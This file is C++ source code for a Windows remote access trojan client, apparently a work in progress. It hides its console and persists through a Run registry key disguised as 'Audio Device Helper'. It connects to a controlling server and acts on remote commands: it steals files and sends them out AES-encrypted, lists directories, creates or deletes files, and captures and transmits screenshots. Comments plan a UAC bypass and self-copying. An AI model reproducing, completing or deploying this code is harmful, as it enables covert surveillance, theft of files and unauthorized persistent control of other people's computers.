#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <gdiplus.h>
#include <bcrypt.h>
#include <vector>
#include <string>
#include <thread>

// make this a gui app with console app entry point to hide console
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "bcrypt.lib")

#define PORT "25566" // port client will connect to
#define MAXDATASIZE 1024 // max number of bytes transferred at once
#define CHUNK_SIZE 1024 * 8 // 8kb chunking for file transfer

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
	UINT num = 0, size = 0;
	Gdiplus::GetImageEncodersSize(&num, &size);
	if (size == 0) return -1;
	Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)malloc(size);
	Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);

	for (UINT i = 0; i < num; ++i) {
		if (wcscmp(pImageCodecInfo[i].MimeType, format) == 0) {
			*pClsid = pImageCodecInfo[i].Clsid;
			free(pImageCodecInfo);
			return 0;
		}
	}
	free(pImageCodecInfo);
	return -1;
}

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

// fixed
std::vector<BYTE> AesEncrypt(const BYTE* data, DWORD dataLen, const BYTE* key, DWORD keyLen, bool isLast) {
	BCRYPT_ALG_HANDLE	hAlg = NULL;
	BCRYPT_KEY_HANDLE	hKey = NULL;
	std::vector<BYTE>	cipherText;
	DWORD				cbCipherText = 0, cbResult = 0, flag = (isLast) ? BCRYPT_BLOCK_PADDING: 0;

	// handle khi dataLen = 0 vì BCryptEncrypt apparently sẽ trả về nullptr, debug sau
	static const BYTE dummy_input[1] = { 0 };
	const BYTE* effective_input = (dataLen > 0) ? data : dummy_input;

	// open algorithm provider
	if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) return {};
	// set mode to ECB
	if (!NT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0))) return {};
	// generate the key object
	if (!NT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PBYTE)key, keyLen, 0))) return {};
	// calculate output size with padding
	if (!NT_SUCCESS(BCryptEncrypt(hKey, (PUCHAR)effective_input, dataLen, NULL, NULL, 0, NULL, 0, &cbCipherText, flag))) return {};
	cipherText.resize(cbCipherText);
	// encrypt
	if (!NT_SUCCESS(BCryptEncrypt(hKey, (PUCHAR)effective_input, dataLen, NULL, NULL, 0, cipherText.data(), cbCipherText, &cbResult, flag))) {
		return {};
	}

	// Cleanup
	BCryptDestroyKey(hKey);
	BCryptCloseAlgorithmProvider(hAlg, 0);

	return cipherText;
}

std::vector<BYTE> genKey(const char* secret) {
	if (secret != NULL) {
		BCRYPT_ALG_HANDLE hAlg = NULL;
		std::vector<BYTE> key(64);
		NTSTATUS status;

		if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG))) return {};
		const BYTE salt[] = { 0x36, 0x67, 0x69, 0x42, 0x20, 0x66, 0x77, 0x88 };
		status = BCryptDeriveKeyPBKDF2(hAlg, (PUCHAR)secret, strlen(secret), (PUCHAR)salt, 8, 2048, key.data(), 32, 0);
		BCryptCloseAlgorithmProvider(hAlg, 0);
		if (!NT_SUCCESS(status)) return {};

		return key;
	}
}

// fixed
void stealfile(SOCKET s, char* filepath) {
	FILE* file = fopen(filepath, "rb");
	if (!file) {
		char msg[] = "[-] Failed to open file.\n";
		send(s, "[-] Failed to open file.\n", (int)strlen(msg), 0);
		free(filepath);
		return;
	}
	fseek(file, 0, SEEK_END);
	long originalSize = ftell(file);
	rewind(file);

	// calculate the padding that aes would add
	long encryptedSize = ((originalSize / 16) + 1) * 16;

	char filename[256];
	const char* p = strrchr(filename, '\\');
	if (p) strcpy(filename, p + 1);
	else strcpy(filename, filepath);

	char header[512];
	snprintf(header, sizeof header, "FILE_ENC %s %ld %ld", filename, originalSize, encryptedSize);
	send(s, header, (int)strlen(header), 0);
	Sleep(500); //wait for server to be ready after getting header

	// key to match
	std::vector<BYTE> key = genKey("this is a generic secret!");

	if (originalSize == 0) {
		std::vector<BYTE> emptyBlock = AesEncrypt(NULL, 0, key.data(), 32, 1);
		send(s, (char*)emptyBlock.data(), (int)emptyBlock.size(), 0);
	}
	else {
		std::vector<BYTE> fileBuffer(CHUNK_SIZE);
		long totalRead = 0;

		while (totalRead < originalSize) {
			size_t bytesRead = fread(fileBuffer.data(), 1, CHUNK_SIZE, file);
			if (bytesRead == 0) break;
			bool isLast = ((totalRead + bytesRead) == originalSize);
			std::vector<BYTE> encryptedChunk = AesEncrypt(fileBuffer.data(), bytesRead, key.data(), 32, isLast);
			if (send(s, (char*)encryptedChunk.data(), encryptedChunk.size(), 0) == SOCKET_ERROR) break;

			totalRead += bytesRead;
		}
	}
	fclose(file);
	printf("[+] Sent encrypted file: %s\n", filename);
	free(filepath);
}

// figure out uac bypass later
void replicate() {
	wchar_t filename[MAX_PATH];
	wchar_t newLocation[MAX_PATH];
	DWORD size = GetModuleFileNameW(NULL, filename, MAX_PATH);
	_snwprintf(newLocation, MAX_PATH, L"%s\\AudioDeviceHelper.exe", _wgetenv(L"LOCALAPPDATA"));
	if (!CopyFileW(filename, newLocation, FALSE)) {
		char ErrStr[256];
		FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM,
			NULL, GetLastError(),
			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
			ErrStr, 256, NULL);
		printf("%s", ErrStr);
	}
}

void addToStartup() {
	wchar_t filepath[MAX_PATH];
	GetModuleFileNameW(NULL, filepath, MAX_PATH);
	// add the --slient tag
	/*
	wchar_t newFilepath[MAX_PATH * 2]; 
	swprintf_s(newFilepath, _countof(newFilepath), L"\"%s\" --silent", filepath);
	*/

	HKEY hKey;
	LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);

	if (result == ERROR_SUCCESS) {
		result = RegSetValueExW(hKey, L"Audio Device Helper", 0, REG_SZ, (BYTE*)filepath, (wcslen(filepath)+1)*sizeof(wchar_t));

		if (result != ERROR_SUCCESS) printf("[-] Failed to write to registry.\n");
		RegCloseKey(hKey);
	}
	else {
		printf("[-] Could not open registry key.\n");
	}
}

void ExecuteCommand(char* command, SOCKET s) {
	char* action = command;
	char* arg = NULL;

	char* spacePtr = strchr(command, ' ');

	if (spacePtr != NULL) {
		*spacePtr = '\0';
		arg = spacePtr + 1;
	}

	if (strcmp(action, "sendmsg") == 0) {
		if (arg) {
			printf("> INCOMING MSG: %s\n", arg);
		}
	}
	else if (strcmp(action, "stealfile") == 0) {
		if (arg) {
			// fixed
			printf("> Stealing file: %s\n", arg);
			char* filepath = _strdup(arg);
			/*char* test = (char*)malloc(strlen(arg) + 1);
			strcpy(test, arg);
			_strdup is basically this*/
			std::thread stealfileThread(stealfile, s, filepath);
			stealfileThread.detach();
		} // ls files in current dir if no arg
		else {
			WIN32_FIND_DATA findData;
			HANDLE hfind;
			std::string fileList = "\n";
			
			hfind = FindFirstFileA(".\\*", &findData);

			do {
				if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0) continue;

				if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
					fileList += "[DIR] ";
				}
				else {
					fileList += "[FILE] ";
				}
				fileList += findData.cFileName;
				fileList += "\n";
			} while (FindNextFileA(hfind, &findData) != 0);
			FindClose(hfind);
			int totalSent = 0;
			int bytesLeft = fileList.length();

			while (totalSent < fileList.length()) {
				int sent = send(s, fileList.c_str() + totalSent, bytesLeft, 0);
				if (sent == SOCKET_ERROR) break;
				totalSent += sent;
				bytesLeft -= sent;
			}
		}
	}
	else if (strcmp(action, "mkfile") == 0) {
		if (arg) {
			printf("> Creating file: %s\n", arg);
			FILE* file = fopen(arg, "w");
			if (file) {
				fclose(file);
				char msg[256];
				snprintf(msg, sizeof msg, "File '%s' created\n", arg);
				send(s, msg, (int)strlen(msg), 0);
			}
			else {
				fclose(file);
				char msg[256];
				snprintf(msg, sizeof msg, "Could not create file '%s'\n", arg);
				send(s, msg, (int)strlen(msg), 0);
			}
		}
	}
	else if (strcmp(action, "delete") == 0) {
		if (arg) {
			if (remove(arg) == 0) {
				char msg[256];
				snprintf(msg, sizeof msg, "File '%s' deleted\n", arg);
				send(s, msg, (int)strlen(msg), 0);
			}
			else {
				char msg[256];
				snprintf(msg, sizeof msg, "Could not delete file '%s'\n", arg);
				send(s, msg, (int)strlen(msg), 0);
			}
		}
	}
	else if (strcmp(action, "screencap") == 0) {
		// screen to memory
		HDC hdcScreen = GetDC(NULL);
		HDC hdcMem = CreateCompatibleDC(hdcScreen);
		int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
		int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
		SelectObject(hdcMem, hBitmap);
		BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

		// convert bitmap to jpg
		CLSID jpgClsid;
		Gdiplus::Bitmap* bmp = Gdiplus::Bitmap::FromHBITMAP(hBitmap, NULL);
		IStream* pStream = NULL;
		CreateStreamOnHGlobal(NULL, TRUE, &pStream);
		GetEncoderClsid(L"image/jpeg", &jpgClsid);
		bmp->Save(pStream, &jpgClsid, NULL);

		// extract the raw bytes from stream
		LARGE_INTEGER liZero = {};
		ULARGE_INTEGER uliSize = {};
		pStream->Seek(liZero, STREAM_SEEK_END, &uliSize);
		pStream->Seek(liZero, STREAM_SEEK_SET, NULL);

		ULONG jpgSize = (ULONG)uliSize.QuadPart;
		char* rawData = new char[jpgSize];
		ULONG bytesRead;
		pStream->Read(rawData, jpgSize, &bytesRead);

		// send header
		char header[64];
		sprintf(header, "IMG %lu", jpgSize);
		send(s, header, (int)strlen(header), 0);

		Sleep(500);

		// send data
		int totalSent = 0;
		while (totalSent < (int)jpgSize) {
			int sent = send(s, rawData + totalSent, jpgSize - totalSent, 0);
			if (sent == SOCKET_ERROR) break;
			totalSent += sent;
		}

		delete[] rawData;
		pStream->Release();
		delete bmp;
		DeleteObject(hBitmap);
		DeleteDC(hdcMem);
		ReleaseDC(NULL, hdcScreen);
	}
}

void* get_in_addr(struct sockaddr* sa) {
	return &((struct sockaddr_in *)sa)->sin_addr;
}

int main() {
	SetProcessDpiAwarenessContext(DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2);
	WSADATA wsaData;
	int numbytes;
	SOCKET sockfd;
	char buf[MAXDATASIZE];
	struct addrinfo hints, * servinfo, * p;
	int rv; //return value
	char s[INET_ADDRSTRLEN];

	// Initialize GDI+
	Gdiplus::GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

	// Initialize Winsock
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed: %d\n", iResult);
		return 1;
	}
	memset(&hints, 0, sizeof hints);

	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;

	// persistence
	//replicate();
	addToStartup();

	// Resolve the server address and port

	if ((rv = getaddrinfo(NULL, PORT, &hints, &servinfo)) != 0) {
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rv));
		WSACleanup();
		return 1;
	}

	// loop through all the results and connect to the first one possible
	for (p = servinfo; p != NULL; p = p->ai_next) {
		if ((sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == INVALID_SOCKET) {
			printf("client: socket error: %d\n", WSAGetLastError());
			continue;
		}

		inet_ntop(p->ai_family, get_in_addr((struct sockaddr*)p->ai_addr), s, sizeof s);
		printf("client: attempting connection to %s\n", s);

		if (connect(sockfd, p->ai_addr, (int)p->ai_addrlen) == SOCKET_ERROR) {
			printf("client: connect error: %d\n", WSAGetLastError());
			closesocket(sockfd);
			continue;
		}

		break;
	}

	if (p == NULL) {
		fprintf(stderr, "client: failed to connect\n");
		freeaddrinfo(servinfo);
		WSACleanup();
		return 2;
	}

	inet_ntop(p->ai_family, get_in_addr((struct sockaddr*)p->ai_addr), s, sizeof s);
	printf("client: connected to %s\n", s);

	freeaddrinfo(servinfo); // all done with this structure

	//recived hello world first
	if ((numbytes = recv(sockfd, buf, MAXDATASIZE, 0)) == SOCKET_ERROR) {
		printf("Failed to recieve test message\n");
	}
	else {
		buf[numbytes] = '\0';

		printf("client: received '%s'\n", buf);
	}

	while (true) {
		numbytes = recv(sockfd, buf, MAXDATASIZE, 0);
		if (numbytes > 0) {
			buf[numbytes] = '\0';

			ExecuteCommand(buf, sockfd);
		}
		else break;
	}
	closesocket(sockfd);
	Gdiplus::GdiplusShutdown(gdiplusToken);
	WSACleanup();

	return 0;
}